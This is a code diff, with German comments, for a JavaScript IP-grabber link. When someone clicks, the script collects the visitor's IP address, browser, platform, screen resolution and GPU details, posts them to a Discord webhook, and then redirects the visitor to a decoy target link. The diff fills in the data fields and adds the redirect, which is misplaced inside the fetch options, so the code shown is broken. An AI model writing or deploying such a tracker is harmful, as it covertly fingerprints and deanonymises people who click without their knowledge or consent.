@@ -30,15 +30,15 @@ fetch("https://api.ipify.org?format=json")
     }
 
     // Nachricht formatieren
-     const payload = {
+      const payload = {
       content: `# 📨 NEUER KLICK AUF DEN LINK!
-**📌 IP-Adresse:** \`${zeitstempel}\`
-**🌐 Browsertyp:** \`${zeitstempel}\`
-**📱 Plattform:** \`${zeitstempel}\`
-**🖥️ Bildschirmauflösung:** \`${zeitstempel}\`
-**🎮 GPU Info (WebGL):** \`${zeitstempel}\`
+**📌 IP-Adresse:** \`${ip}\`
+**🌐 Browsertyp:** \`${browser}\`
+**📱 Plattform:** \`${platform}\`
+**🖥️ Bildschirmauflösung:** \`${screenResolution}\`
+**🎮 GPU Info (WebGL):** \`${gpuInfo}\`
 **⏰ Uhrzeit:** \`${zeitstempel}\`
-**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${zeitstempel}>`
+**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${ip}>`
     };
 
     // An Discord senden
@@ -48,6 +48,7 @@ fetch("https://api.ipify.org?format=json")
         "Content-Type": "application/json"
       },
       body: JSON.stringify(payload)
+      window.location.href = zielLink;
     }).catch(err => {
       console.error("Fehler beim Senden an Discord:", err);
     });
